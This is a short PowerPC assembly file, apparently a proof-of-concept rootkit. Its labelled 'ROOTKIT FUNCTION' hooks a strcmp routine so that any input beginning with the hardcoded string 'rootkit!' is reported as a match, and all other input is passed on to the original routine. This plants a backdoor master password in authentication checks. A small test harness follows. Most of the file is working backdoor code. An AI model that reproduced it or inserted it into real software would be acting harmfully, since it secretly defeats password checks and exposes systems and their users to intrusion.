.text
.globl _start
# START ROOTKIT FUNCTION 
_strcmp:
    mflr %r0
    stw %r3, -0x8(%r1) 
    stw %r4, -0xc(%r1) 
    stw %r5, -0x10(%r1) 
    stw %r6, -0x14(%r1) 
    stw %r7, -0x18(%r1) 
    xor. %r4, %r4, %r4 
    bnel _strcmp
    mflr %r4
    addi %r4, %r4, 96 
    xor %r5, %r5, %r5
_loop:
    lbz %r6, 0(%r3) 
    lbz %r7, 0(%r4) 
    cmpwi %r7, 0 
    beq _success 
    cmpw %r6, %r7 
    bne _fail
    addi %r3, %r3, 1 
    addi %r4, %r4, 1 
    b _loop
_success:
    li %r3, 1 
    b _fix_up
_fail:
    lwz %r3,-0x8(%r1)
_fix_up:
    lwz %r4,-0xc(%r1)
    lwz %r5,-0x10(%r1)
    lwz %r6,-0x14(%r1)
    lwz %r7,-0x18(%r1)
    mtlr %r0
    cmpwi %r3, 1 
    beq _success_ret 
    b 0x00000000
_success_ret: 
    blr
rkPass:
    .ascii "rootkit!" 
    .long 0
# END ROOTKIT FUNCTION 
_start:
    lis %r3, enteredPass@ha
    addi %r3, %r3, enteredPass@l
    bl _strcmp 
    li %r0, 1 
    li %r3, 0 
    sc
enteredPass: .ascii "realPassEntered!" 
.long 0